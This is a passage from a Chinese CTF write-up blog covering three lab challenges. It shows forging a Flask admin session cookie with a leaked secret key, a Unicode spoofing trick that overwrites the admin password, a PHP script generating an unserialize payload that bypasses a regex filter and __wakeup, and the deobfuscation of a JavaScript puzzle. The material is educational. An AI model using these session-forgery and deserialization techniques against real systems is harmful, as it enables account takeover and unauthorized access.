class="hljs-string">&#x27;XXXXXXXXX&#x27;</span><br></code></pre></td></tr></table></figure><p>然后在主运行文件里面添加config文件里面的内容。</p><p>main.py或者routes.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br><span class="hljs-keyword">import</span> config<br>app = Flask(__name__)<span class="hljs-number">1.2</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span>.<br></code></pre></td></tr></table></figure><p>配置方法二：</p><p>直接在主运行文件里面配置。配置config的时候也是和操作字典是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br>app = Flask(__name__)<br><br><span class="hljs-comment">#key值可以使用随机数，或者自定义</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;XXXXX&#x27;</span><br>或者随机数<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">24</span>)<br>或者<br>app.secret_key = <span class="hljs-string">&#x27;why would I tell you my secret key?&#x27;</span><br></code></pre></td></tr></table></figure></blockquote><p>所以伪造session就需要全局宏<code>SECRET_KEY</code></p><p>此时的config.py里面就是<strong>ckj123</strong></p><blockquote><p>SECRET_KEY = os.environ.get(‘SECRET_KEY’) or ‘ckj123’ #os.environ.get()函数的作用是获取系统的环境变量</p></blockquote><p>说到这里 暑假应该学几个主流的web框架</p><p>使用工具<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><blockquote><p>用法</p><h3 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.<span class="hljs-keyword">py</span> encode [-h] -s <span class="hljs-symbol">&lt;string&gt;</span> -t <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -t <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-structure <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie structure<br></code></pre></td></tr></table></figure><h3 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager.<span class="hljs-keyword">py</span> decode [-h] [-s <span class="hljs-symbol">&lt;string&gt;</span>] -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-value <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie value<br></code></pre></td></tr></table></figure></blockquote><p>使用工具 放入session和密钥进行解密</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> .\flask_sessio<span class="hljs-symbol">n_cookie_manager3</span>.py decode -c <span class="hljs-string">&quot;.eJw9kMFqwkAQhl-lzNlD3NiL4KGStCQwk8suw-xFrMYka2IhKhtXfPduLXgahv_j45-5w-Yw1ucWlpfxWs9g0-1heYe3b1iCZfHI-YT82WG2P4qyjhgT1GuHCpOK85SydV_puGm8EVNHquytLjwpVKKLmyizsM74yA3oipRC6yyTE2d70dRZLZFDRa7scSgmdDJZLnthSavsI6DKPekmFW08DnlSaQlxegl9S2wdhthPNyt4zGB3Hg-by8-xPr1OoIARl4S-ihT1boHavKMrW5uJrzLzp4l1j8FyfhPOg7BtbbN66rph29Qvk-H9ZPx_ctoOMYC5SmEG13M9Pr8G8wQevyIRbIY.YL7OEw.x49ZKtawASOf-9J3S9O9bWjVgTE&quot;</span> -s <span class="hljs-string">&quot;ckj123&quot;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&#123;&#x27;_fresh&#x27;: False, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;&#125;<br></code></pre></td></tr></table></figure><p>然后伪造admin的session</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure><p>放入工具 设置密钥 加密</p><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">python3 .\flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;ef01a11ab07dcfc5c410c3c49a740e9361325cb7bee207c6a22ce8f5040f22778ceccb6ea3be66a3662e2b1261ebeaf78033a0587a502a49632a0c9a5fc31118&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;7332f44b717815922ad60850c9ee93ea2aa3afaf&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;QgqS&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;<span class="hljs-string">&quot; -s &quot;</span>ckj123<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.eJw<span class="hljs-number">9</span>kMFqwkAQhl-lz<span class="hljs-symbol">NlD3</span><span class="hljs-symbol">NiL4</span>KGStCQwk<span class="hljs-number">8</span>suw-xFrMYka<span class="hljs-number">2</span>IhKhtXfPduLXgahv_j<span class="hljs-number">45</span><span class="hljs-number">-5</span>w-Yw<span class="hljs-number">1</span>ucWlpfxWs<span class="hljs-number">9</span><span class="hljs-name">g0</span><span class="hljs-number">-1</span>heYe<span class="hljs-number">3</span>b<span class="hljs-number">1</span>iCZfHI-YT<span class="hljs-number">82</span>W<span class="hljs-name">G2</span>P<span class="hljs-number">4</span>qyjhgT<span class="hljs-number">1</span>GuHCpOK<span class="hljs-number">85</span>SydV_puG<span class="hljs-name">m8</span>EV<span class="hljs-symbol">NHquytLjwpVKKLmyizsM74</span>yA<span class="hljs-number">3</span>oipRC<span class="hljs-number">6</span>yyTE<span class="hljs-number">2</span>d<span class="hljs-number">70</span>dRZLZFDRa<span class="hljs-number">7</span>scSgmdDJZL<span class="hljs-symbol">nthSavsI6</span>DKPekmFW<span class="hljs-number">08</span>D<span class="hljs-symbol">nlSaQlxegl9</span>S<span class="hljs-number">2</span>wdhthP<span class="hljs-symbol">Nyt4</span>zGB<span class="hljs-number">3</span>Hg-by<span class="hljs-number">8</span>-xPr<span class="hljs-number">1</span>OoIARl<span class="hljs-number">4</span>S-ihT<span class="hljs-number">1</span>boHavKMrW<span class="hljs-number">5</span>uJrzLzp<span class="hljs-number">4</span>l<span class="hljs-number">1</span>j<span class="hljs-number">8</span>FyfhPO<span class="hljs-name">g7</span>Btbb<span class="hljs-symbol">N66</span>rph<span class="hljs-number">29</span>Qvk-H<span class="hljs-number">9</span>ZPx_ctoOMYC<span class="hljs-number">5</span>SmE<span class="hljs-name">G13</span><span class="hljs-name">M9</span>Pr<span class="hljs-number">8</span><span class="hljs-name">G8</span>wQevyIRbIY.YL<span class="hljs-number">7</span>RrA.ztSPmJ<span class="hljs-number">8</span>Wrg-xigAr_j<span class="hljs-number">3</span>XyEwrheY<br></code></pre></td></tr></table></figure><p>登录后页面刷新抓包 修改session放包</p><h3 id="方法三、Unicode欺骗"><a href="#方法三、Unicode欺骗" class="headerlink" title="方法三、Unicode欺骗"></a>方法三、Unicode欺骗</h3><p>我们再聚焦于routes.py上 在register和login以及change三个模块上均有strlower()函数 而这个函数不是python的自带函数lower()</p><p>找一下这个函数原型或者有没有定义</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">def <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br><span class="hljs-function">    username =</span> nodeprep.<span class="hljs-built_in">prepare</span>(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure><p>调用了nodeprep.prepare()函数 继续跟进 发现导入了nodeprep模块 继续跟进发现这是来自twisted库</p><p>再注意到requirements.txt里面描述了twisted的版本 <strong>Twisted==10.2.0</strong> 对比官网发现版本已经很低了 存在有Unicode的漏洞 这个点只能说大多数早期开发都难免有这个问题或那个问题 而Unicode作为比较通用的东西 肯定是要测试的 当然有相关的漏洞报告复现出来更具有说服力 而不是像笔者只能复现wp</p><p>到这个网站<a href="https://unicode-table.com/en/search/?q=Modifier+Letter+Capital">Search - Unicode Character Table (unicode-table.com)</a> 挑选字符ᴬᴰᴹᴵᴺ</p><p>用这个字符注册 那么此时存入数据库的就应该是大写<strong>ADMIN</strong></p><p>那我们登录用ᴬᴰᴹᴵᴺ还是<strong>ADMIN</strong>呢</p><p>注意 登录操作也有一次strlower() 所以仍然需要是要假值ᴬᴰᴹᴵᴺ</p><p>然后 我们目的是修改掉admin的密码 然后以admin登录</p><p>那么就用change password功能修改密码 此时修改密码时 再次触发strlower()</p><p>此时<strong>ADMIN</strong>就变成了amdin覆盖掉数据库原来的值</p><p>就可以使用admin登录了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124512198.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124515020.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124538163.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124723891.png"></p><p>登录成功和回显证明ᴬᴰᴹᴵᴺ被转义为<strong>ADMIN</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124748298.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124805856.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124913625.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608124926624.png"></p><h3 id="方法四、代码逻辑漏洞"><a href="#方法四、代码逻辑漏洞" class="headerlink" title="方法四、代码逻辑漏洞"></a>方法四、代码逻辑漏洞</h3><p>login函数和change函数都在没有完全check身份的情况下，执行了session有关的赋值</p><h2 id="攻防世界Web-php-unserialize"><a href="#攻防世界Web-php-unserialize" class="headerlink" title="攻防世界Web_php_unserialize"></a>攻防世界Web_php_unserialize</h2><p>这题其实很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$var</span> = base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @unserialize(<span class="hljs-variable">$var</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-string">&quot;index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>10行：实例化Demo对象fl4g.php时，__wakeup()会重置file变量</p><p>19行：在不区分大小写的情况下 ， 若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式 ， 那么就被过滤。</p><blockquote><p>preg_match()中<strong>i</strong>表示不敏感大小写 里面匹配字符可以**/—/<strong>和</strong>/b—/b**(只匹配单词)匹配内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_match(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br>preg_match(<span class="hljs-string">&quot;/\bweb\b/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br><br><span class="hljs-comment">#从URL获取域名 写法一</span><br>preg_match(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<span class="hljs-string">&quot;http://www.php.net/index.html&quot;</span>, <span class="hljs-variable">$matches</span>)<span class="hljs-comment">//匹配http://和/划分开的三部分保存到数组</span><br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<span class="hljs-comment">//提取中间的部分 即www.php.net</span><br>preg_match(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<span class="hljs-comment">//[^.]+中^匹配一次及以上 [^.]+表示不包含.字符的一个或多个字符 进行匹配两次 即得到php net 中间/. 即用.拼接 得到php.net覆盖到变量$matches</span><br><br><span class="hljs-comment">#URL获取域名 写法二</span><br>preg_match(‘/^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">6</span>&#125;)([\/\w \.-]*)*\/?$/’）<br></code></pre></td></tr></table></figure><p>其他内容 去系统学习一下Perl的正则匹配</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Dmeo(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=serialize(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//o:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&quot;o:4&quot;</span>,<span class="hljs-string">&quot;o:+4&quot;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过正则匹配 具体见博客</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过__wakeup() 这个漏洞详见反序列化漏洞</span><br><span class="hljs-comment">//var_dump($a);</span><br>var_dump(base64_encode(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里需要说的是20、21行注释掉得到的<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p><p>手动修改后<code>O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code>base64加密放到payload不能拿到flag 如下图</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/06/21/.png"></p><p>这里有个坑，这里的file变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大2，如果将序列化结果复制到在线的base64网站进行编码可能就会丢掉空白字符，所以这里直接在php代码里进行编码。类似的还有protected类型的变量，序列化之后字符串首部会加上%00*%00。</p><h2 id="攻防世界NaNNaNNaNNaN-Batman"><a href="#攻防世界NaNNaNNaNNaN-Batman" class="headerlink" title="攻防世界NaNNaNNaNNaN-Batman"></a>攻防世界NaNNaNNaNNaN-Batman</h2><p>下载附件 得到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;script&gt;_=&#x27;function $()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123;[0]);.splice(0,1)&#125;&#125;&#125;\&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;write(s[o%4]buttonif(e.ment&#x27;;for(Y in $=&#x27;&#x27;)with(_.split($[Y]))_=join(pop());eval(_)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>得到乱码 可以使用Sublime Text处理一下</p><p>将上面的代码最后的eval函数换为alert后放到www打开</p><p>得到源码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/06/23/.png"></p><p>复制下来格式放到<a href="https://beautifier.io/%E5%A4%84%E7%90%86%E4%B8%80%E4%B8%8B">https://beautifier.io/处理一下</a> 得到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;be0f233ac7be98aa&#x27;</span>).value<br>  <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">var</span> t = [<span class="hljs-string">&#x27;fl&#x27;</span>, <span class="hljs-string">&#x27;s_a&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;e&#125;&#x27;</span>]<br>            <span class="hljs-keyword">var</span> n = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;_h0l&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>]<br>            <span class="hljs-keyword">var</span> r = [<span class="hljs-string">&#x27;g&#123;&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;_0&#x27;</span>]<br>            <span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>]<br>            <span class="hljs-keyword">var</span> s = [t, n, r, i]<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>              <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>])<br>              s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>)<br><span class="hljs-keyword">delete</span> _<br></code></pre></td></tr></table></figure><p>代码审计的话 就要懂正则表达式了 ^表示匹配开头 $表示匹配末尾</p><p>多个if下来得到payload:<code>be0f23233ace98aa</code> 放到输入框得到flag 但是我没有成功</p><p>放到控制台也尝试了 原因未明</p><p>那么就直接跳过if 将下面代码放到控制台</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> t = [<span class="hljs-string">&quot;fl&quot;</span>, <span class="hljs-string">&quot;s_a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;e&#125;&quot;</span>];<br><span class="hljs-keyword">var</span> n = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_h0l&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> r = [<span class="hljs-string">&quot;g&#123;&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_0&quot;</span>];<br><span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> s = [t, n, r, i];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>    <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);<br>    s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span 